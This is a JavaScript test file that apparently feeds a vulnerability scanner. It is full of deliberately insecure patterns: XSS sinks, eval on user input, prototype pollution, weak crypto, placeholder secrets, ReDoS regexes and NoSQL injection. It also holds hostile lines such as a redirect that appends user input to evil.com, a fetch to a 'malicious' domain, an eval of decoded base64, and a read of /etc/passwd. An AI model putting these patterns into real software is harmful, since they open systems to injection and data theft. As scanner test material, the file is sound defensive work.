// Test file for JavaScript vulnerability detection
// This file contains intentionally vulnerable code patterns for testing

// XSS Vulnerabilities
function updateContent(userInput) {
    document.getElementById('content').innerHTML = '<div>' + userInput + '</div>';
    document.body.outerHTML = 'New content: ' + userInput;
    document.write('User data: ' + userInput);
    element.insertAdjacentHTML('beforeend', '<span>' + userInput + '</span>');
}

// React XSS
function ReactComponent({ userContent }) {
    return <div dangerouslySetInnerHTML={{__html: '<p>' + userContent + '</p>'}} />;
}

// jQuery XSS
$('#target').html('<div>' + userInput + '</div>');
$('#list').append('<li>' + userInput + '</li>');

// Prototype Pollution
function merge(target, source) {
    Object.assign(target, source.__proto__);
    target['__proto__'].polluted = true;
    target.constructor.prototype.isAdmin = true;
}

// JSON parsing with user input
const userData = JSON.parse(req.body.data);

// Eval patterns
eval('console.log("' + userInput + '")');
new Function('return ' + userInput)();
setTimeout('alert("' + userInput + '")', 1000);
const worker = new Worker('data:application/javascript,' + userScript);

// DOM manipulation
window.location = 'https://evil.com/' + userInput;
iframe.src = 'javascript:' + userCode;
form.action = '/submit?' + userParams;

// Weak cryptography
const randomId = Math.random() * 1000000;
const hash = crypto.createHash('md5').update(password).digest('hex');
const cipher = crypto.createCipher('des', key);
const encoded = btoa(secretData);

// Hardcoded secrets
const apiKey = "sk-1234567890abcdefghijklmnopqrstuvwxyz";
const dbUrl = "mongodb://admin:password123@localhost:27017/mydb";
const githubToken = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
const awsKey = "AKIAIOSFODNN7EXAMPLE";

// ReDoS patterns
const regex1 = /(.*)+ /;
const regex2 = /([^.]+)+/;
const regex3 = /(\w*)+/;
const vulnerablePattern = /(a+)+b/;

// Supply chain attacks
const script = document.createElement('script');
script.src = 'https://cdn.polyfill.io/v2/polyfill.min.js';
document.head.appendChild(script);

// Suspicious CDN
fetch('https://malicious.tk/api/data');
eval(atob('ZG9jdW1lbnQud3JpdGUoJ2hhY2tlZCcp'));

// Path traversal
const fs = require('fs');
fs.readFile('../../../etc/passwd', callback);
const filePath = path.join(uploadDir, req.params.filename);

// Template injection
const template = `<div>{{user.name | safe}}</div>`;
const output = `<div>{{{userInput}}}</div>`;
const ejs = `<%= ${untrustedInput} %>`;

// Weak randomness in security contexts
const sessionToken = Math.random().toString(36);
const csrfToken = Date.now().toString();
const passwordSalt = Math.random() * 999999;

// NoSQL injection
User.find({ username: req.body.username, password: req.body.password });
db.users.findOne({ $where: req.body.query });